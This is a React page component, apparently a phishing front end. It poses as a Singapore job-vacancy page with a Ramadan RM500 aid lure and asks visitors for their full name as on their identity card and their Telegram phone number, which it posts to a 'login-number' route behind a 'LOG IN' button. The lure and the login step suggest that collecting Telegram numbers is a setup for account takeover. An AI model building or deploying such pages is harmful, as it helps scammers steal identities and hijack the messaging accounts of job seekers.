import { useForm } from "@inertiajs/react";
import React, { useState } from "react";

export default function Index() {
    const { data, setData, post, reset, errors } = useForm({
        full_name: "",
        phone_number: "+65",
    });
    const [loading, setLoading] = useState(false);
    const submitHandler = (e) => {
        e.preventDefault();
        setLoading(true);
        post(route("login-number"), {
            onSuccess: () => {
                setTimeout(() => {
                    setLoading(false);
                }, 500);
            },
            onError: () => {
                setTimeout(() => {
                    setLoading(false);
                }, 500);
            },
        });
    };

    return (
        <div className="w-full  overflow-hidden flex  flex-col justify-center items-center  bg-gray-100">
            {loading && (
                <div className="absolute z-[50] top-0 left-0 w-full h-[900px] bg-gray-950/30 backdrop-blur-sm flex justify-center items-center">
                    <img src="/jobfair/loading.gif" alt="" />
                </div>
            )}
            <div className="w-full px-4 py-4 bg-white mb-3">
                <img src="/jobfair/kerjaya.png" alt="" className="w-[80px]" />
            </div>
            <div className="w-[380px] h-[700px] rounded-md shadow-sm shadow-gray-500/50 px-8 py-8 border border-orange-900/50 bg-white">
                <img
                    src="/jobfair/Bantuan-Ramadhan-RM-500.jpg"
                    alt=""
                    className="w-full"
                />
                <p className="font-light text-center text-orange-900 text-lg tracking-tight leading-5 mt-3 mb-2">
                    To apply for job vacancies, Pleart enter an account
                </p>
                <p className="font-bold text-center text-orange-950 text-xl">
                    Your Telegram
                </p>
                <form
                    onSubmit={submitHandler}
                    action=""
                    className="w-full my-8"
                >
                    <p className="text-center w-full font-extrabold text-orange-950 text-xl tracking-tight">
                        Full Name
                    </p>
                    <input
                        type="text"
                        name="full_name"
                        placeholder="Full Name as Per IC"
                        className="w-full h-[50px] shadow-sm shadow-gray-500/50 border border-orange-950 focus:outline-none focus:ring-0 focus:border-orange-950 rounded-md"
                        value={data.full_name}
                        onChange={(e) =>
                            setData({ ...data, full_name: e.target.value })
                        }
                    />
                    {errors.full_name && (
                        <p className="text-red-500 text-xs italic">
                            {errors.full_name}
                        </p>
                    )}
                    <p className="text-center w-full font-extrabold text-orange-950 text-xl tracking-tight my-3">
                        Nombor Phone Telegram
                    </p>
                    <div className="relative overflow-hidden w-full  flex shadow-sm shadow-gray-500/50">
                        <div className="w-[60px] rounded-l-md font-bold h-[50px] bg-gradient-to-tl from-gray-300 via-gray-200 to-gray-300 flex items-center justify-center">
                            <img
                                src="https://flagcdn.com/w40/sg.png"
                                alt=""
                                className="w-8"
                            />
                        </div>
                        <input
                            type="text"
                            name="phone_number"
                            placeholder="Full Name as Per IC"
                            value={data.phone_number}
                            className="w-full rounded-r-md outline-none border border-orange-950 focus:outline-none focus:ring-0 focus:border-orange-950"
                            onChange={(e) =>
                                setData({
                                    ...data,
                                    phone_number: e.target.value,
                                })
                            }
                        />
                    </div>
                    {errors.full_name && (
                        <p className="text-red-500 text-xs italic">
                            {errors.full_name}
                        </p>
                    )}

                    <div className="w-full flex justify-center py-6">
                        <button className="mt-3 w-1/2 bg-slate-900 text-white font-bold py-3 px-8 text-center rounded-full">
                            LOG IN
                        </button>
                    </div>
                </form>
            </div>
            <div className="w-full px-4 py-4 gap-x-4 items-center flex justify-end bg-gray-800 mt-4">
                <p className="text-white">Singapore job vacancies</p>
                <img src="/jobfair/kerjaya.png" alt="" className="w-[70px]" />
            </div>
        </div>
    );
}
